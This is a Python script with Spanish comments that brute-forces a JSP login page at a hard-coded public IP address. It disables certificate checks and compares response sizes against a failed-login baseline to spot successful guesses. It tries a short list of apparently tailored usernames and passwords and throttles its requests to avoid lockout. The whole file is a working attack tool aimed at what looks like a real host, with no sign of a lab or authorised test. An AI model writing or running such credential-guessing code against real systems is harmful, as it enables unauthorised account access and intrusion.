import requests
import time

class SmartBruteForcer:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        self.baseline_response = None
    
    def establish_baseline(self):
        """Establecer línea base de respuesta de login fallido"""
        print("[+] Estableciendo línea base...")
        
        # Login con credenciales incorrectas
        login_data = {
            'yAccion': 'login',
            'yUsuario': 'usuario_inexistente',
            'xUsuario': 'usuario_inexistente',
            'xContrasena': 'password_incorrecto',
            'yIntentos': '1'
        }
        
        response = self.session.post(f"{self.target}/jsp/index.jsp", data=login_data)
        self.baseline_response = {
            'size': len(response.text),
            'content': response.text
        }
        
        print(f"Línea base (login fallido): {self.baseline_response['size']} bytes")
        return self.baseline_response
    
    def smart_brute_force(self):
        """Fuerza bruta inteligente comparando respuestas"""
        print("\n[+] Fuerza bruta inteligente...")
        
        if not self.baseline_response:
            self.establish_baseline()
        
        # Lista de credenciales a probar
        credentials = [
            ('hnieto', 'utslp'),
            ('admin', 'admin'),
            ('admin', 'utslp'),
            ('sito', 'sito'),
            ('utslp', 'utslp'),
            ('hnieto', 'password'),
            ('hnieto', 'hnieto'),
            ('', '')  # Credenciales vacías
        ]
        
        for username, password in credentials:
            try:
                # Crear nueva sesión para cada intento
                temp_session = requests.Session()
                temp_session.verify = False
                
                login_data = {
                    'yAccion': 'login',
                    'yUsuario': username,
                    'xUsuario': username,
                    'xContrasena': password,
                    'yIntentos': '1'
                }
                
                response = temp_session.post(f"{self.target}/jsp/index.jsp", data=login_data)
                response_size = len(response.text)
                
                # Comparar con línea base
                size_diff = abs(response_size - self.baseline_response['size'])
                
                print(f"Usuario: {username:15} Password: {password:15} | Tamaño: {response_size:5} bytes | Dif: {size_diff:4}")
                
                # Si la diferencia es significativa, podría ser un login exitoso
                if size_diff > 100:  # Diferencia significativa
                    print(f"   ⚠️  POSIBLE LOGIN EXITOSO! Diferencia significativa: {size_diff} bytes")
                    
                    # Verificar contenido
                    if 'error' not in response.text.lower():
                        print(f"   ✅ Sin mensajes de error")
                    
                    # Guardar respuesta para análisis
                    with open(f'response_{username}_{password}.html', 'w', encoding='utf-8') as f:
                        f.write(response.text)
                
                time.sleep(0.5)  # Evitar bloqueos
                
            except Exception as e:
                print(f"Error con {username}:{password} - {e}")

# Ejecutar
smart_brute = SmartBruteForcer("http://189.254.143.102")
smart_brute.smart_brute_force()